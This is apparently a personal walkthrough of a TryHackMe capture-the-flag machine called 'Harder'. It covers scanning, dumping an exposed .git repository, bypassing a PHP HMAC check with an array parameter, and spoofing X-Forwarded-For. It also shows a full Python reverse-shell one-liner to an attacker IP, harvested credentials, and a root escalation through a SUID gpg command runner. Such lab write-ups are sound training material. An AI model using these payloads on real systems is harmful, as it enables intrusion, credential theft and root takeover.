----
Real pentest findings combined
----

![](https://assets.tryhackme.com/img/banners/default_tryhackme.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/4a70bd07bced343f9adf02c10e499ed5.png)

### Task 1  Hack your way and try harder

 Start Machine

The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distribution is used and where certain configurations are located.

Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists ([https://tools.kali.org/password-attacks/seclists](https://tools.kali.org/password-attacks/seclists)). Read the source with care.

Edit: There is a second way to get root access without using any key...are you able to spot the bug?

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.5.192 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.5.192:2
Open 10.10.5.192:22
Open 10.10.5.192:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 19:06 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:06
Completed Parallel DNS resolution of 1 host. at 19:06, 0.01s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:06
Scanning 10.10.5.192 [3 ports]
Discovered open port 80/tcp on 10.10.5.192
Discovered open port 22/tcp on 10.10.5.192
Discovered open port 2/tcp on 10.10.5.192
Completed Connect Scan at 19:06, 0.21s elapsed (3 total ports)
Initiating Service scan at 19:06
Scanning 3 services on 10.10.5.192
Completed Service scan at 19:07, 6.81s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.5.192.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 11.76s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 1.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
Nmap scan report for 10.10.5.192
Host is up, received user-set (0.21s latency).
Scanned at 2023-07-17 19:06:54 EDT for 20s

PORT   STATE SERVICE REASON  VERSION
2/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f88c1e071df3de8a01f15051e4e600fe (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEFmFCa+IH2JigaT+Z8eV8W3N0cSDkslS33rwJ1tptuG0IvY5mvhC/bYiNO9vTigCiTgkHXKiFp0Kog0kiPPzihW3PU8HSpQHuSAH27vRsKR9mHY24rj7PA2mPxjObkD6PqS4Yq2YVK6BKV3RY+dYIIe0nbqFNyB/QiK7+EXXHrQLnboMy35uXfM2vy02XJxDRlhd/lyepiMXWVdTo2LHgnjL8bl9oiRzIYEtYzXg7jQErNamPwes4fqokd4Di+ma5zmeCxYfu+75/E49gvQEwwUUWJNbjAokOe8XKUwZsJsoUcJAMqn/gk0HAVZ4rdHqziWTYIGSsNeTJHyX7vB3r
|   256 e65dea6c838620def0f03a1e5f7d47b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtXi31P1Ad+O7K71zZTGscq53c+5mUQTA/KxVNEc1Xm3I/7ubkunbVoR4MWt5v4SrYZnVB7iUbjXWiwmzRnwOw=
|   256 e9efd378db9c47207e62829d8f6f456a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKRvDffPpS8dq2oJcYvNPU2NzZtjbVppVt1wM8Y52P/i
22/tcp open  ssh     syn-ack OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   4096 cfe2d927d2d9f3f78e5dd2f99da4fb66 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCns4FcsZGpefUl1pFm7KRPBXz7nIQ590yiEd6aNm6DEKKVQOUUT4TtSEpCaUhnDU/+XHFBJfXdm73tzEwCgN7fyxmXSCWDWu1tC1zui3CA/sr/g5k+Az0u1yTvoc3eUSByeGvVyShubpuCB5Mwa2YZJxiHu/WzFrtDbGIGiVcQgLJTXdXE+aK7hbsx6T9HMJpKEnneRvLY4WT6ZNjw8kfp6oHMFvz/lnDffyWMNxn9biQ/pSkZHOsBzLcAfAYXIp6710byAWGwuZL2/d6Yq1jyLY3bic6R7HGVWEX6VDcrxAeED8uNHF8kPqh46dFkyHekOOye6TnALXMZ/uo3GSvrJd1OWx2kZ1uPJWOl2bKj1aVKKsLgAsmrrRtG1KWrZZDqpxm/iUerlJzAl3YdLxyqXnQXvcBNHR6nc4js+bJwTPleuCOUVvkS1QWkljSDzJ878AKBDBxVLcFI0vCiIyUm065lhgTiPf0+v4Et4IQ7PlAZLjQGlttKeaI54MZQPM53JPdVqASlVTChX7689Wm94//boX4/YlyWJ0EWz/a0yrwifFK/fHJWXYtQiQQI02gPzafIy7zI6bO3N7CCkWdTbBPmX+zvw9QcjCxaq1T+L/v04oi0K1StQlCUTE12M4fMeO/HfAQYCRm6tfue2BlAriIomF++Bh4yO73z3YeNuQ==
|   256 1e457b0ab5aa87e61bb1b79f5d8f8570 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+INGLWU0nf9OkPJkFoW9Gx2tdNEjLVXHrtZg17ALjH
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:07
Completed NSE at 19:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.12 seconds

<span class="text-muted">This page is powered by php-fpm</span>

                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -host http://10.10.5.192 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.5.192
+ Target Hostname:    10.10.5.192
+ Target Port:        80
+ Start Time:         2023-07-17 19:10:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: Retrieved x-powered-by header: PHP/7.3.19.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie TestCookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.5.192 -i200,301,302,401 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/witty/.dirsearch/reports/10.10.5.192/_23-07-17_19-09-42.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-17_19-09-42.log

Target: http://10.10.5.192/

[19:09:43] Starting: 
[19:10:14] 301 -  169B  - /vendor  ->  http://10.10.5.192:8080/vendor/

response 

HTTP/1.1 200 OK

Server: nginx/1.18.0

Date: Mon, 17 Jul 2023 23:08:19 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

Vary: Accept-Encoding

X-Powered-By: PHP/7.3.19

Set-Cookie: TestCookie=just+a+test+cookie; expires=Tue, 18-Jul-2023 00:08:19 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure

Content-Length: 1985

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.5.192  pwd.harder.local

http://pwd.harder.local/index.php

admin:admin

extra security in place. our source code will be reviewed soon ...


┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u pwd.harder.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.harder.local" --hc 404 --hw 166
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://pwd.harder.local/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000001726:   200        23 L     457 W      19912 Ch    "shell"   

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.5.192  pwd.harder.local shell.harder.local

http://shell.harder.local/index.php

admin:admin

Invalid login credentials!

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u shell.harder.local -i200,301,302,401 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/witty/.dirsearch/reports/shell.harder.local_23-07-17_19-18-39.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-17_19-18-39.log

Target: http://shell.harder.local/

[19:18:40] Starting: 
[19:18:58] 301 -  169B  - /vendor  ->  http://shell.harder.local:8080/vendor/
CTRL+C detected: Pausing threads, please wait...

using another wordlist

/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt

or large

┌──(witty㉿kali)-[~/Downloads]
└─$ cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep gitignore

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u pwd.harder.local -i200,301,302,401 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 17129

Output File: /home/witty/.dirsearch/reports/pwd.harder.local_23-07-17_19-25-05.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-17_19-25-05.log

Target: http://pwd.harder.local/

[19:25:06] Starting: 
[19:25:08] 200 -   19KB - /index.php
[19:25:10] 200 -    0B  - /auth.php
[19:25:12] 200 -   19KB - /.
[19:25:27] 301 -  169B  - /.git  ->  http://pwd.harder.local:8080/.git/

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u shell.harder.local -i200,301,302,401 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 17129

Output File: /home/witty/.dirsearch/reports/shell.harder.local_23-07-17_19-24-29.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-17_19-24-29.log

Target: http://shell.harder.local/

[19:24:36] Starting: 
[19:24:39] 200 -   19KB - /index.php
[19:24:41] 200 -    0B  - /auth.php
[19:24:44] 200 -   19KB - /.
[19:24:57] 200 -   73B  - /ip.php

http://shell.harder.local/ip.php

Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed

X-Forwarded-For:10.10.10.1

response

HTTP/1.1 200 OK

Server: nginx/1.18.0

Date: Mon, 17 Jul 2023 23:28:45 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

Vary: Accept-Encoding

X-Powered-By: PHP/7.3.19

Content-Length: 0

┌──(witty㉿kali)-[~/Downloads]
└─$ cat index.gitignore 
credentials.php
secret.php

┌──(witty㉿kali)-[~/Downloads]
└─$ cd ../bug_hunter 
                                                                              
┌──(witty㉿kali)-[~/bug_hunter]
└─$ ls     
Burp-Suite                   GG-Dorking      MyScripts         svn-extractor
CertificateTransparencyLogs  github-search   pastebin-scraper  waybackMachine
commoncrawl                  GitTools        Photon            xsser
Endpoints                    knockpy_report  s3brute           XSStrike
GCPBucketBrute               lazyrecon       SQLiDetector      xxeserv
                                                                              
┌──(witty㉿kali)-[~/bug_hunter]
└─$ cd GitTools 
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools]
└─$ ls
Dumper  Extractor  Finder  LICENSE.md  README.md
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools]
└─$ cd Dumper   
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper]
└─$ ls
gitdumper.sh  README.md

┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper]
└─$ ./gitdumper.sh http://pwd.harder.local/.git/ git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/93/99abe877c92db19e7fc122d2879b470d7d6a58
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/ad/68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
[+] Downloaded: objects/04/7afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
[+] Downloaded: objects/e3/361e96c0a9db20541033f254df272deeb9dba7
[+] Downloaded: objects/c6/66164d58b28325393533478750410d6bbdff53
[+] Downloaded: objects/aa/938abf60c64cdb2d37d699409f77427c1b3826
[+] Downloaded: objects/cd/a7930579f48816fac740e2404903995e0ff614
[+] Downloaded: objects/22/8694f875f20080e29788d7cc3b626272107462
[+] Downloaded: objects/66/428e37f6bfaac0b42ce66106bee0a5bdf94d4e
[+] Downloaded: objects/6e/1096eae64fede71a78e54999236553b75b3b65
[+] Downloaded: objects/be/c719ffb34ca3d424bd170df5f6f37050d8a91c

┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper]
└─$ cd git   
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ ls
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ ls -lah
total 12K
drwxr-xr-x 3 witty witty 4.0K Jul 17 19:35 .
drwxr-xr-x 3 witty witty 4.0K Jul 17 19:35 ..
drwxr-xr-x 6 witty witty 4.0K Jul 17 19:35 .git
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ cd .git         
                                                                              
┌──(witty㉿kali)-[~/…/GitTools/Dumper/git/.git]
└─$ ls -lah
total 44K
drwxr-xr-x  6 witty witty 4.0K Jul 17 19:35 .
drwxr-xr-x  3 witty witty 4.0K Jul 17 19:35 ..
-rw-r--r--  1 witty witty   14 Jul 17 19:35 COMMIT_EDITMSG
-rw-r--r--  1 witty witty   92 Jul 17 19:35 config
-rw-r--r--  1 witty witty   73 Jul 17 19:35 description
-rw-r--r--  1 witty witty   23 Jul 17 19:35 HEAD
-rw-r--r--  1 witty witty  361 Jul 17 19:35 index
drwxr-xr-x  2 witty witty 4.0K Jul 17 19:35 info
drwxr-xr-x  3 witty witty 4.0K Jul 17 19:35 logs
drwxr-xr-x 15 witty witty 4.0K Jul 17 19:35 objects
drwxr-xr-x  5 witty witty 4.0K Jul 17 19:35 refs
                                                                              
┌──(witty㉿kali)-[~/…/GitTools/Dumper/git/.git]
└─$ git log                                       
commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:12:23 2019 +0300

    add gitignore

commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:11:32 2019 +0300

    add extra security

commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 14:00:52 2019 +0300

    added index.php
                                                                              
                          
┌──(witty㉿kali)-[~/…/GitTools/Dumper/git/.git]
└─$ cd ..           
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ git checkout .
Updated 4 paths from the index

┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ ls -lah
total 48K
drwxr-xr-x 3 witty witty 4.0K Jul 17 19:37 .
drwxr-xr-x 3 witty witty 4.0K Jul 17 19:35 ..
-rw-r--r-- 1 witty witty  24K Jul 17 19:37 auth.php
drwxr-xr-x 6 witty witty 4.0K Jul 17 19:37 .git
-rw-r--r-- 1 witty witty   27 Jul 17 19:37 .gitignore
-rw-r--r-- 1 witty witty  431 Jul 17 19:37 hmac.php
-rw-r--r-- 1 witty witty  608 Jul 17 19:37 index.php
                                                                              
┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ cat auth.php        
<?php
define('LOGIN_USER', "admin");
define('LOGIN_PASS', "admin");

function check(){

	if(md5($this->prefix . LOGIN_PASS) != $this->pass || LOGIN_USER != $this->user){
		//destroy any existing cookie by setting time in past
		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
		session_unset();
		session_destroy();

		$msg='<span class="red">'.INCORRECT_USERNAME_PASSWORD.'</span>';
		$this->prompt($msg);
	}
}


──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ cat hmac.php      
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>

https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/

"_Complexity is the worst enemy of security_"

┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
└─$ php -a
Interactive shell

php > $hmac = hash_hmac('sha256', Array(), "SecretKey");
PHP Warning:  Uncaught TypeError: hash_hmac(): Argument #2 ($data) must be of type string, array given in php shell code:1
Stack trace:
#0 php shell code(1): hash_hmac()
#1 {main}
  thrown in php shell code on line 1
php > echo $hmac == false;
PHP Warning:  Undefined variable $hmac in php shell code on line 1
1
php > $hmac = hash_hmac('sha256', "securify.nl", false);
php > echo $hmac;
c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5

nonce[]=&hostname=securify.nl&hmac=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5


if (empty($_GET['h']) || empty($_GET['host'])) {

so 

or 

n[]=&host=securify.nl&h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5

http://pwd.harder.local/index.php?n[]=&host=securify.nl&h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5

url 	username 	password (cleartext)
http://shell.harder.local 	evs 	9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm

login

Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed

X-Forwarded-For:10.10.10.1

POST /index.php HTTP/1.1

Host: shell.harder.local

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 63

Origin: http://shell.harder.local

X-Forwarded-For:10.10.10.1

Connection: close

Referer: http://shell.harder.local/index.php

Cookie: PHPSESSID=4se9himrrv161rk7jfvmm8cnjt

Upgrade-Insecure-Requests: 1



action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm

       <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command</strong></label>
				 <input type="text" class="form-control" name="cmd" id="cmd" value="" required>

action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm&cmd=id

uid=1001(www) gid=1001(www) groups=1001(www)

revshell

An error occurred.

Sorry, the page you are looking for is currently unavailable.
Please try again later.

If you are the system administrator of this resource then you should check the error log for details.

Faithfully yours, nginx.

rebooting

action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm&cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

using /bin/bash crash the machine

python3 -c "import pty; pty.spawn('/bin/sh')"
/home $ ls      
ls
evs  www

# Press Ctrl+Z


stty raw -echo; fg; reset;

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;

/home $ ls
evs  www
/home $ cd evs
/home/evs $ ls
user.txt
/home/evs $ cat user.txt
7e88bf11a579dc5ed66cc798cbe49f76

/home/evs $ uname -a; cat /etc/issue
Linux harder 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 Linux
Welcome to Alpine Linux 3.12
Kernel \r on an \m (\l)

/home/evs $ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/home/evs $ netstat -tunlp
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      31/python3
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      11/nginx: worker pr
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      11/nginx: worker pr
tcp        0      0 :::22                   :::*                    LISTEN      -
/home/evs $ find / -perm -4000 2>/dev/null
/usr/local/bin/execute-crypted

/home/evs $ find / -name *.sh 2>/dev/null
/usr/bin/findssl.sh
/usr/local/bin/run-crypted.sh
/etc/periodic/15min/evs-backup.sh

/home/evs $ cat /etc/periodic/15min/evs-backup.sh
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh evs@10.10.30.41               
The authenticity of host '10.10.30.41 (10.10.30.41)' can't be established.
ED25519 key fingerprint is SHA256:qe/uay80+hZjgfhQilcT9xOMMgrAk0nCK7Ng5g7bLMM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.30.41' (ED25519) to the list of known hosts.
evs@10.10.30.41's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

harder:~$ id
uid=1000(evs) gid=1000(evs) groups=1000(evs)

harder:~$ cat /usr/local/bin/run-crypted.sh
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi


harder:~$ find / -name root@harder.local* 2> /dev/null
/var/backup/root@harder.local.pub

harder:~$ cd /var
harder:/var$ ls
backup  empty   local   log     opt     spool   www
cache   lib     lock    mail    run     tmp
harder:/var$ cd backup
harder:/var/backup$ ls
root@harder.local.pub
harder:/var/backup$ ls -lah
total 16K    
drwxr-x---    1 root     evs         4.0K Jul  7  2020 .
drwxr-xr-x    1 root     root        4.0K Jul  7  2020 ..
-rwxr-x---    1 root     evs          641 Jul  7  2020 root@harder.local.pub

harder:/var/backup$ /usr/local/bin/execute-crypted
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg

harder:/var/backup$ cat root@harder.local.pub
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEXwTf8RYJKwYBBAHaRw8BAQdAkJtb3UCYvPmb1/JyRPADF0uYjU42h7REPlOK
AbiN88i0IUFkbWluaXN0cmF0b3IgPHJvb3RAaGFyZGVyLmxvY2FsPoiQBBMWCAA4
FiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwMFCwkIBwIGFQoJCAsCBBYC
AwECHgECF4AACgkQyR1mFZRPaHSt8wD8CvJLt7qyCXuJZdOBPR+X7GI2dUg0DRRu
c5gXzwk3rMMA/0JK6ZwZCHObWjwX0oLc3jvOCgQiIdaPq1WqN9/fhLAKuDgEXwTf
8RIKKwYBBAGXVQEFAQEHQNa/To/VntzySOVdvOCW+iGscTLlnsjOmiGaaWvJG14O
AwEIB4h4BBgWCAAgFiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwwACgkQ
yR1mFZRPaHTMLQD/cqbV4dMvINa/KxATQDnbaln1Lg0jI9Jie39U44GKRIEBAJyi
+2AO+ERYahiVzkWwTEoUpjDJIv0cP/WVzfTvPk0D
=qaa6
-----END PGP PUBLIC KEY BLOCK-----

 since we have a PGP public key owned by `root`, **we can try to get a reverse shell**!! or read the flag

Import the PGP public key via `gpg --import`

harder:/var/backup$ gpg --import root@harder.local.pub
gpg: directory '/home/evs/.gnupg' created
gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
gpg: Total number processed: 1
gpg:               imported: 1


harder:/var/backup$ nano read_flag
-ash: nano: not found
harder:/var/backup$ vim read_flag
-ash: vim: not found

http://osr5doc.xinuos.com/en/OSUserG/_Stopping_vi.html#:~:text=%3Awq,editing%20more%20than%20one%20file.

ctrl +c cz i don't have esc

:wq

:q!

harder:/home$ cd evs
harder:~$ ls
user.txt
harder:~$ vi read_flag
harder:~$ cat read_flag 
cat /root/root.txt > /home/evs/root.txt

now encrypt the file


gpg --encrypt --output read_flag.gpg --recipient root@harder.local read_flag 

or

gpg -er root read_flag

or

gpg -e -r "Administrator" read_flag

harder:~$ gpg -er root read_flag
gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

